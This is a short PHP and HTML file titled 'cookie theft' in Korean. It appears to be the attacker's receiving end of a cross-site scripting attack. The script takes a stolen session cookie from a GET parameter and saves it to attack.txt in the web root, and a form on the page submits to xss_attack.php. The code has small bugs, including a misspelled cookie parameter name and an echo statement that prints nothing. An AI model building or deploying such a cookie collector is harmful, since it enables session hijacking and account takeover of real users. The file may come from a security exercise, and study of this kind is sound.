<?php
session_start();
//세션에 들어있는 phpssid를 가져옴






$cookie=$_GET['PHPSSESID'];
$save_file=fopen("/var/www/html/attack.txt","w");
fwrite($save_file,$cookie);
fclose($save_file);
?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>쿠키 탈취</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

    <h1>쿠키 탈취</h1>
    <form method="get" action="xss_attack.php">
        <label for="cookie">쿠키:</label>
        <input type="text" id="cookie" name="cookie" value="<?php $cookie?>" required>
        <input type="submit" value="등록">
    </form>
    <footer>
        © 2023 게시판. 모든 권리 보유.
    </footer>

</body>

</html>
